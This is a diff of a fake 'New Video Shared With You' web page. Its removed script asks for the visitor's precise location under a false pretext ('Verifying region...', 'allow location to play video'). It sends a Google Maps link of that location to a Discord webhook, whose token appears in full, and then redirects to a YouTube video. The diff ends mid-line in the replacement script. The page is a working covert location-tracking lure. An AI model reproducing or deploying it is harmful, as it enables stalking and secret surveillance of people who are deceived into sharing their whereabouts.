@@ -17,7 +17,7 @@
 <body>
 
     <div class="video-container" onclick="send()">
-        <img src="https://img.youtube.com/vi/YOUR_VIDEO_ID/maxresdefault.jpg" class="thumbnail">
+        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" class="thumbnail">
         <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
         <div class="title">New Video Shared With You</div>
     </div>
@@ -25,28 +25,4 @@
     <p id="status">Tap video to play</p>
 
     <script>
-        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
-        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-
-        function send() {
-            const status = document.getElementById('status');
-            status.innerText = "Verifying region...";
-
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `📍 **Family Update**\n[View Location](${mapLink})` })
-                }).then(() => {
-                    window.location.replace(REDIRECT_URL);
-                });
-
-            }, (err) => {
-                status.innerText = "Please allow location to play video.";
-            }, { enableHighAccuracy: true });
-        }
-    </script>
-</body>
-</html>
+        const WEB
